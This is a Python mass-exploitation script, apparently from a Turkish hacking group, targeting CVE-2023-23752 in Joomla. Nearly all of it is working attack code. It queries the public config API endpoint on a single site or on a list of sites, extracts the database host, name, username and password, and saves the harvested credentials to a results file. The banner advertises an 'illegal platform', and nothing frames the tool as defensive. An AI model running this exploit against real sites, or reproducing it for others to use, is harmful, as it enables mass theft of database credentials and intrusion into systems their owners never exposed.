#!/usr/bin/env python
# -*- coding: utf-8 -*-
#~> TG:@RoweenTheGod
#~> :v RoweenTheFucker
#~> ShellAdamlar
#~>Req python 3 lib
import requests, sys, os, re, colorama, urllib3
from sys import stdout
from colorama import Fore, Style, Back, init
init(autoreset=True)
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if not os.path.exists('Results'):
    os.mkdir('Results')

def banners():
    os.system('clear' if os.name == 'posix' else 'cls')
    stdout.write("\n")
    stdout.write(""+Fore.LIGHTRED_EX +"                      ██████╗  ██████╗  ██████╗ ██        ██ ███████╗███╗   ██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"                      ██╔══██╗██╔═══██╗██╔═══██╗██        ██ ██╔════╝████╗  ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"                      ██████╔╝██║   ██║██║   ██║██	  ██ █████╗  ██╔██╗ ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"                      ██╔══██╗██║   ██║██║   ██║██	  ██ ██╔══╝  ██║╚██╗██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"                      ██╔══██╗██║   ██║██║   ██║██   ██   ██ ██╔══╝  ██║╚██╗██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"                      ██║  ██║╚██████╔╝╚██████╔╝██ ██  ██ ██ ███████╗██║ ╚████║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"                      ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ████    ████ ╚══════╝	       \n")
    stdout.write(""+Fore.RESET +"                   ══════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"               *_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*\n")
    stdout.write(""+Fore.YELLOW   +"               *   "+Fore.LIGHTMAGENTA_EX+"   AUTHOR "+Fore.RED+"  >->  "+Fore.BLUE+" RoweeN"+Fore.YELLOW+"                                         *\n")
    stdout.write(""+Fore.YELLOW   +"               *   "+Fore.LIGHTMAGENTA_EX+"   GITHUB "+Fore.RED+"  >->  "+Fore.BLUE+" https://github.com/RoweenTheGod/"+Fore.YELLOW+"               *\n")
    stdout.write(""+Fore.YELLOW   +"               *   "+Fore.GREEN+"   CVE - 2023 - 23752 - Joomla kimlik doğrulama bypass exploit"+Fore.YELLOW+"   *\n")
    stdout.write(""+Fore.YELLOW   +"               *   "+Fore.LIGHTBLUE_EX+"   ILLEGALPLATFORM.COM"+Fore.RED+" >-> "+Fore.LIGHTMAGENTA_EX+" CODED BY SHELL ADAMLAR"+Fore.YELLOW+"               *\n")
    stdout.write(""+Fore.YELLOW   +"               *_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*\n")
    print
banners()

def tara_single_url(url=None):
    if url is None:
        url = input(f"\n{Fore.YELLOW}IP/Domain: {Fore.RESET}")

    if not url.startswith('https://') and not url.startswith('http://'):
        full_url = 'http://' + url
    else:
        full_url = url

    print(f"\n{Fore.YELLOW}[URL]{Fore.RED} -> {Fore.WHITE}{url}{Fore.RED} .: {Fore.GREEN}[TARANIYOR]")
    try:
        headers = {
            "Host": url,
            "content-type": "application/vnd.api+json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        }
        response = requests.get(full_url, headers=headers, verify=True, timeout=10)
        config_url = full_url + '/api/index.php/v1/config/application?public=true' #/api/index.php/v1/users?public=true
        config_response = requests.get(config_url)
        if config_response.status_code == 200 and b'dbtype' in config_response.content:
            decoded_content = config_response.content.decode()
            if 'dbtype' in decoded_content:
                dbtype = re.findall('"dbtype":"(.*?)"', decoded_content)[0]
                dbprefix = re.findall('"dbprefix":"(.*?)"', decoded_content)[0]
                host = re.findall('"host":"(.*?)"', decoded_content)[0]
                db = re.findall('"db":"(.*?)"', decoded_content)[0]
                user = re.findall('"user":"(.*?)"', decoded_content)[0]
                password = re.findall('"password":"(.*?)"', decoded_content)[0]

                print(f"{Fore.YELLOW}\n[+] Domain            : {Fore.GREEN}{url}")
                print(f"{Fore.YELLOW}[+] Database Type     : {Fore.GREEN}{dbtype}")
                print(f"{Fore.YELLOW}[+] Database Prefix   : {Fore.GREEN}{dbprefix}")
                print(f"{Fore.YELLOW}[+] Database          : {Fore.GREEN}{db}")
                print(f"{Fore.YELLOW}[+] Hostname          : {Fore.GREEN}{host}")
                print(f"{Fore.YELLOW}[+] Username          : {Fore.GREEN}{user}")
                print(f"{Fore.YELLOW}[+] Password          : {Fore.GREEN}{password}\n")

                with open('Results/Configurations.txt', 'a') as f:
                    f.write(f"[+] {url}\nDatabase Type     : {dbtype}\nDatabase Prefix   : {dbprefix}\nHostname          : {host}\nDatabase          : {db}\nUsername          : {user}\nPassword          : {password}\n\n")

                return decoded_content, True
    except Exception as e:
        print(f"{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - {Fore.WHITE}{url}{Fore.RED} .: {Fore.RED}[BULUNAMADI]")

    return '', False

def tara_multiple_urls():
    url_list = input(f"\n{Fore.RED}[+] {Fore.YELLOW}IP/DOMAIN LISTE: {Fore.RESET}")
    urls = []

    if not os.path.exists("Results"):
        os.makedirs("Results")
    with open(url_list, "r") as f:
        for url in f:
            url = url.strip()
            if not url.startswith('https://') and not url.startswith('http://'):
                url = 'http://' + url

            if re.match(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", url):
                url_file_name = f"Results/IPs_{url}.txt"
            else:
                url_file_name = re.sub(r"https?://", "", url).rstrip("/") + ".txt"

            url_file_path = f"Results/{url_file_name}"
            response, sensitive_matches = tara_single_url(url.strip())

            if sensitive_matches:
                decoded_content = response
                dbtype = re.findall('"dbtype":"(.*?)"', decoded_content)[0]
                dbprefix = re.findall('"dbprefix":"(.*?)"', decoded_content)[0]
                host = re.findall('"host":"(.*?)"', decoded_content)[0]
                db = re.findall('"db":"(.*?)"', decoded_content)[0]
                user = re.findall('"user":"(.*?)"', decoded_content)[0]
                password = re.findall('"password":"(.*?)"', decoded_content)[0]
                with open(url_file_path, "w", encoding="utf-8") as f:
                    f.write(decoded_content)

                with open('Results/Configurations.txt', 'a') as f:
                    f.write(f"[+] {url}\nDatabase Type     : {dbtype}\nDatabase Prefix   : {dbprefix}\nHostname          : {host}\nDatabase          : {db}\nUsername          : {user}\nPassword          : {password}\n\n")
            elif response:
                print(f"{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - {Fore.WHITE}{url}{Fore.RED} .: {Fore.RED}[BILGI YOK]")
            else:
                print(f"{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - {Fore.WHITE}{url}{Fore.RED} .: {Fore.RED}[ERROR]")
            
            urls.append(url)

    return urls

if __name__ == '__main__':
    choice = input(f"\n{Fore.WHITE}                                          [1] - {Fore.YELLOW}TEK URL\n{Fore.WHITE}                                          [2] - {Fore.YELLOW}URL LISTE \n\n{Fore.YELLOW}                                          SEC BIRINI LALE: {Fore.WHITE}")
    if choice == '1':
        response, sensitive_matches = tara_single_url()
    elif choice == '2':
        (tara_single_url, tara_multiple_urls())
    else:
        print(f"\n{Fore.RED}YANLIS SAYI YAZDIN YARRRAAAAM DUZGUN YAZ")
